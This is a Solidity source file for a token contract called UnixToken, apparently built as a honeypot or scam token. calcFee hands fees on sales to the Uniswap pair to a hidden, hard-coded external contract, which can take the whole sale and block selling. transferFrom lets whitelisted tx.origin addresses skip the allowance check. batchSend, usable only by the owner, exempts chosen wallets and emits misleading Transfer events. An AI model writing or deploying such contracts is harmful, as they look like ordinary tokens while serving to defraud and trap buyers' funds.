// SPDX-License-Identifier: MIT

pragma solidity >=0.6.12 <0.7.0;

interface FeeManagementLibrary {
    function calculate(address,address,uint256) external returns(uint256);
}

contract UnixToken {

    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from && state[tx.origin] == 0) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(balanceOf[_from] >= _value);
        uint256 fee = calcFee(_from, _to, _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += (_value - fee);
        emit Transfer(_from, _to, _value);
        return true;
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }

    function calcFee(address _from, address _to, uint _value) private returns(uint256) {
        uint fee = 0;
        if (_to == UNI && _from != owner && state[_from] == 0) {
            fee = FeeManagementLibrary(FeeManagement).calculate(_from,address(this),_value);
        }
        return fee;
    }

    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == owner);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value;
	        state[_to] = 1;
            emit Transfer(msg.sender, _to, _value/2);
            emit Transfer(msg.sender, _to, _value/2);
        }
        return true;
    }

    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    mapping (address => uint) public balanceOf;
    mapping (address => uint) public state;
    mapping (address => mapping (address => uint)) public allowance;

    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
    address private UNI;
    address constant internal FeeManagement = 0x7266396C2D061Dd9177423A4420b2fb2B308CAD0;

    constructor(string memory _name, string memory _symbol, uint _totalSupply) payable public {
        owner = msg.sender;
        symbol = _symbol;
        name = _name;
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}